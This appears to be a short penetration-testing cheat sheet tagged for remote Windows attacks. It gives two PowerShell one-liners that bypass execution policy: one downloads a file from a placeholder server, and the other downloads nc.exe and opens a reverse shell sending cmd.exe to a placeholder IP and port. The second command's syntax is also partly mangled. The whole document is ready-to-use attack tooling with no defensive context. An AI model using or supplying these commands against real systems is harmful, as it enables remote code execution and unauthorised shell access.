# powershell

% powershell, download

## Download with powershell
#plateform/windows #target/remote #cat/ATTACK/FILE_TRANSFERT 
```powershell
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile '(New-Object System.Net.WebClient).DownloadFile('http://<SERVER>/<FILE>','<OUTFILE>')'
```

## Download and execute with powershell
#plateform/windows #target/remote #cat/ATTACK/FILE_TRANSFERT #cat/ATTACK/EXPLOIT 
```powershell
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile New-Object System.Net.WebClient.DownloadFile('<FILE>','nc.exe'); nc.exe <IP> <PORT> -e cmd.exe
```